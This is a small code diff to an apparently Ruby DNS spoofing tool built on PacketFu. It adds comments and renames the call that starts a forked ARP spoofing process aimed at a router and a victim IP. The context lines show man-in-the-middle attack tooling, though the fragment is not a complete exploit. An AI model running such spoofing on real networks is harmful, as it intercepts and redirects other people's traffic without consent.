@@ -20,6 +20,7 @@ include PacketFu
 
 class DnsSpoof
     
+    # Initialize the variables and information
     def initialize (routerIP, victimIP, interface)
         
         # Check for values
@@ -51,10 +52,11 @@ class DnsSpoof
         
         # Create the ARP Spoofing process
         @pid = fork do
+            # Ensure that we shut down cleanly
             Signal.trap("INT") { `sysctl -w net.inet.ip.forwarding=0`; exit }
             arp = ArpSpoof.new(@routerIP, @routerMAC, @victimIP, @victimMAC,
                                @interface, @ourInfo)
-            arp.runspoof
+            arp.main
         end
         
         sleep 5
